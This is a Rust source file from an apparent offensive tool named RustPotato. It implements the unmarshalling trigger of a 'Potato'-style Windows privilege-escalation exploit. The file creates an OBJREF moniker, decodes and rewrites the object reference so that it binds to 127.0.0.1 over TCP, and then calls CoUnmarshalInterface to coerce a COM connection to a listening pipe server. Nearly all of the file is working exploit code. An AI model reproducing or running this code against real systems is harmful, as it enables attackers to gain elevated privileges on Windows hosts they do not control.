use base64::Engine;
use base64::engine::general_purpose::STANDARD;

use windows::Win32::System::Com::Marshal::CoUnmarshalInterface;
use windows::Win32::System::Com::StructuredStorage::CreateStreamOnHGlobal;
use windows::Win32::System::Com::{
    COINIT_MULTITHREADED, CoInitializeEx, CreateBindCtx, CreateObjrefMoniker, IBindCtx, IMoniker,
};
use windows::core::{IUnknown, Interface};

use crate::_print;
use crate::def::SampleCOMObject;
use crate::objref::{DualStringArray, ObjRef, SecurityBinding, Standard, StringBinding};
use crate::win32::def::HEAP_ZERO_MEMORY;
use crate::win32::ldr::nt_process_heap;
use crate::win32::ntdll::ntdll;

/// Represents a trigger mechanism for unmarshalling objects using DCOM.
///
/// This structure encapsulates components required for initiating the unmarshalling
/// process, including a standard COM object (`IUnknown`), a binding context (`IBindCtx`),
/// and a moniker (`IMoniker`).
///
/// # Fields
/// - `p_iunknown`: The standard COM object implementing `IUnknown`.
/// - `bind_ctx`: The binding context used to resolve the moniker.
/// - `moniker`: The moniker associated with the COM object.
///
/// # Usage
/// This struct provides methods to initialize and trigger the unmarshalling process,
/// allowing interaction with remote COM objects or servers.
#[allow(dead_code)]
#[derive(Clone)]
pub struct RustPotatoUnmarshalTrigger {
    pub p_iunknown: IUnknown,
    pub bind_ctx: IBindCtx,
    pub moniker: IMoniker,
}

impl RustPotatoUnmarshalTrigger {
    /// Creates a new instance of `RustPotatoUnmarshalTrigger`.
    ///
    /// This function initializes the COM library, creates a standard COM object implementing `IUnknown`,
    /// a bind context, and a moniker to interact with the object. The resulting trigger object encapsulates
    /// these elements for use in unmarshalling operations.
    ///
    /// # Returns
    /// - `Some(RustPotatoUnmarshalTrigger)` if initialization succeeds.
    /// - `None` if any step in the initialization process fails.
    pub fn new() -> Option<Self> {
        // Initialize COM
        let hr = unsafe { CoInitializeEx(None, COINIT_MULTITHREADED) };

        if hr.is_err() {
            _print!("[-] Failed to initialize COM library: {:?}", hr);
            return None;
        }

        // Create a standard COM object for IUnknown
        let p_iunknown: IUnknown = SampleCOMObject.into();

        // Create a bind context
        let bind_ctx = unsafe { CreateBindCtx(0).ok() }?;

        // Create a moniker
        let moniker = unsafe { CreateObjrefMoniker(&p_iunknown).ok() }?;

        Some(RustPotatoUnmarshalTrigger {
            p_iunknown,
            bind_ctx,
            moniker,
        })
    }

    /// Triggers the unmarshalling process using the moniker.
    ///
    /// This function retrieves the moniker's display name, decodes it from Base64, constructs
    /// a new `ObjRef` object with updated details, and serializes it into a byte stream.
    /// Finally, it calls `UnmarshalDCOM` to unmarshal the object from the constructed stream.
    ///
    /// Behavior:
    /// - Validates and processes the moniker display name.
    /// - Reconstructs an object reference (`ObjRef`) with modified parameters.
    /// - Passes the serialized `ObjRef` to the DCOM unmarshalling process.
    ///
    /// Logs errors at each stage if any step fails.
    pub fn trigger(&self) {
        unsafe {
            _print!("[+] Initiating unmarshalling trigger to connect with the pipe server");

            // Retrieve the display name of the moniker
            let display_name_ptr = self.moniker.GetDisplayName(&self.bind_ctx, None);

            // Convert the display name pointer to a Rust String
            let display_name = match display_name_ptr.ok() {
                Some(display_name) => display_name.to_string(),
                None => {
                    _print!("[-] Failed to obtain the display name of the moniker.");
                    return;
                }
            };

            if display_name.is_err() {
                _print!("[-] Failed to convert the moniker's display name into a string.");
                return;
            }

            // Remove "objref:" and decode the Base64 string
            let objref_string = display_name
                .unwrap()
                .replace("objref:", "")
                .replace(":", "");

            let objref_bytes = STANDARD
                .decode(objref_string)
                .map_err(|_| {
                    _print!("[-] Failed to decode the Base64 object reference");
                })
                .ok();

            if objref_bytes.is_none() {
                _print!("[-] The object reference could not be decoded from Base64.");
                return;
            }

            // Parse the object reference (ObjRef) and construct a new ObjRef with updated details
            let tmp_obj_ref_opt = ObjRef::from_bytes(&objref_bytes.unwrap());

            if tmp_obj_ref_opt.is_none() {
                _print!("[-] Could not parse the ObjRef from the provided byte stream.");
                return;
            }

            let tmp_obj_ref = tmp_obj_ref_opt.unwrap();

            let obj_ref = ObjRef::new(
                crate::utils::GUID {
                    value: String::from("00000000-0000-0000-C000-000000000046"),
                },
                Standard {
                    flags: 0,
                    public_refs: 1,
                    oxid: tmp_obj_ref.standard_objref.oxid,
                    oid: tmp_obj_ref.standard_objref.oid,
                    ipid: tmp_obj_ref.standard_objref.ipid,
                    dual_string_array: DualStringArray {
                        string_binding: StringBinding {
                            tower_id: crate::def::TowerProtocol::EpmProtocolTcp,
                            network_address: String::from("127.0.0.1"),
                        },
                        security_binding: SecurityBinding::new(0xa, 0xffff, None),
                        num_entries: 0,
                        security_offset: 0,
                    },
                },
            );

            let data = obj_ref.to_bytes();
            if data.is_none() {
                _print!("[-] ObjRef serialization failed.");
                return;
            }

            UnmarshalDCOM::unmarshal_object(&data.unwrap());
        }
    }
}

/// Provides functionality for unmarshalling objects using DCOM.
///
/// This utility handles the deserialization of byte streams into COM objects and
/// interacts with DCOM to reconstruct interfaces for further use.
pub struct UnmarshalDCOM;

impl UnmarshalDCOM {
    /// Unmarshals an object from a serialized byte stream using DCOM.
    ///
    /// This function performs the following steps:
    /// - Allocates memory from the process heap and copies the stream data into it.
    /// - Creates a COM stream from the allocated memory.
    /// - Uses `CoUnmarshalInterface` to unmarshal the object from the COM stream.
    ///
    /// # Parameters
    /// - `stream`: A slice of bytes representing the serialized object.
    ///
    /// # Returns
    /// - `Some(*mut c_void)` if unmarshalling succeeds, containing a pointer to the unmarshalled interface.
    /// - `None` if any step in the unmarshalling process fails.
    ///
    /// Logs detailed error messages if unmarshalling fails at any stage.
    pub fn unmarshal_object(stream: &[u8]) -> Option<*mut core::ffi::c_void> {
        unsafe {
            // Retrieve the process heap to allocate memory
            let process_heap = nt_process_heap();
            if process_heap.is_null() {
                _print!("[-] Failed to obtain the process heap.");
                return None;
            }

            // Allocate memory from the process heap
            let mut ptr = std::ptr::null_mut();
            if let Some(rtl_allocate_heap) = ntdll().rtl_allocate_heap {
                ptr = rtl_allocate_heap(process_heap, HEAP_ZERO_MEMORY, stream.len());
            }

            if ptr.is_null() {
                _print!("[-] Failed to allocate memory from the process heap.");
                return None;
            }

            // Copy the data into the allocated memory
            std::ptr::copy_nonoverlapping(stream.as_ptr(), ptr as *mut u8, stream.len());

            // Create a COM stream from the allocated memory
            let com_stream =
                CreateStreamOnHGlobal(windows::Win32::Foundation::HGLOBAL(ptr as _), true).ok()?;

            // Perform unmarshalling to retrieve an IUnknown interface
            let interface: Result<IUnknown, windows_core::Error> =
                CoUnmarshalInterface(&com_stream);

            if !interface.is_err() {
                // Retrieve the raw pointer from the unmarshalled interface
                let ppv: *mut std::ffi::c_void =
                    interface.unwrap().as_raw() as *mut core::ffi::c_void;
                Some(ppv)
            } else {
                None
            }
        }
    }
}
